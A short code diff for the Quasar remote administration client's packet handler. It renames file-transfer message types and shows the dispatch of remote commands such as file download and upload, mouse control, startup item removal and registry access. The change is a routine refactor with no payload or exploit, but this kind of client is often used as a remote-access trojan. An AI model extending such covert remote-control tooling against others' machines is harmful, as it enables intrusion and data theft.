@@ -1,6 +1,7 @@
 ﻿using Quasar.Client.Commands;
 using Quasar.Client.ReverseProxy;
 using Quasar.Common.Messages;
+using Quasar.Common.Messages.ReverseProxy;
 
 namespace Quasar.Client.Networking
 {
@@ -59,13 +60,13 @@ namespace Quasar.Client.Networking
             {
                 CommandHandler.HandleGetDirectory((GetDirectory)packet, client);
             }
-            else if (type == typeof(DoDownloadFile))
+            else if (type == typeof(FileTransferRequest))
             {
-                CommandHandler.HandleDoDownloadFile((DoDownloadFile)packet, client);
+                CommandHandler.HandleDoDownloadFile((FileTransferRequest)packet, client);
             }
-            else if (type == typeof(DoUploadFile))
+            else if (type == typeof(FileTransferChunk))
             {
-                CommandHandler.HandleDoUploadFile((DoUploadFile)packet, client);
+                CommandHandler.HandleDoUploadFile((FileTransferChunk)packet, client);
             }
             else if (type == typeof(DoMouseEvent))
             {
@@ -123,9 +124,9 @@ namespace Quasar.Client.Networking
             {
                 CommandHandler.HandleDoStartupItemRemove((DoStartupItemRemove)packet, client);
             }
-            else if (type == typeof(DoDownloadFileCancel))
+            else if (type == typeof(FileTransferCancel))
             {
-                CommandHandler.HandleDoDownloadFileCancel((DoDownloadFileCancel)packet,
+                CommandHandler.HandleDoDownloadFileCancel((FileTransferCancel)packet,
                     client);
             }
             else if (type == typeof(DoLoadRegistryKey))
